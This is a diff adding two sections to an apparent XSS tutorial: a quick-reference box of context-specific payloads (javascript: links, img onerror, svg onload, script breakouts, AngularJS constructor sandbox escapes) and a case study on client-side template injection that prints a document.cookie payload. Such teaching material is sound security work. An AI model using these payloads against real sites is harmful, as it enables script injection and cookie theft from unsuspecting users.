@@ -1,5 +1,20 @@
 # Cross-Site Scripting (XSS): Link Tags, Image Vectors, Page Scripts, & AngularJS Sandbox Bypasses
 
+> [!TIP]
+> ### ⚡ Quick Solution (Direct Execution)
+> Inject the direct payload tailored to the discovered HTML context:
+> - **Link Attribute (`href`):** `javascript:alert(1)`
+> - **Image / Event Handler:** `<img src=x onerror=alert(1)>` or `<svg onload=alert(1)>`
+> - **Inside Script Block:** `';alert(1)//` or `-alert(1)-`
+> - **AngularJS Sandbox Escape:**
+>   ```javascript
+>   {{$on.constructor('alert(1)')()}}
+>   // or universal variant:
+>   {{constructor.constructor('alert(1)')()}}
+>   ```
+
+---
+
 In web security, **Cross-Site Scripting (XSS)** consistently ranks among the most prevalent and critical vulnerabilities. It allows attackers to **execute arbitrary JavaScript in victim browsers** within the legitimate security origin of the vulnerable application.
 
 Beginners often fail by relying solely on the generic `<script>alert(1)</script>` payload, which gets blocked or fails when it does not match the output context.
@@ -194,6 +209,18 @@ Locate `testxss123` via **Inspect Element** or in Burp Repeater responses:
 2. Confirm execution when the `alert(document.domain)` pop-up triggers! 🎉
 
 ---
+
+## 🌍 Real-World Case Study & Security Incidents
+
+### Client-Side Template Injection (CSTI) in Google Subdomains & Yahoo Mail
+AngularJS sandbox escapes demonstrated that standard HTML entity escaping is insufficient against modern frontend frameworks:
+* **The Misconception:** Developers at Google and Yahoo Mail encoded `<script>` and `onerror` HTML tags into entities (`&lt;script&gt;`). They assumed that rendering user input inside HTML templates was safe.
+* **AngularJS Expression Execution:** Because the frontend included the AngularJS runtime (`ng-app`), attackers injected mathematical expressions and constructor escapes:
+  ```javascript
+  {{$on.constructor('alert(document.cookie)')()}}
+  ```
+  The browser-side template engine parsed the double curly braces `{{...}}` and evaluated JavaScript directly within client memory.
+* **Impact:** These discoveries yielded dozens of **$3,133.70 to $10,000 USD** payouts under the Google Vulnerability Reward Program (VRP), ultimately leading the AngularJS core team to officially deprecate the client-side sandbox in AngularJS 1.6+.
 
 ## 4. Backend Source Code: Vulnerable vs. Secure
 
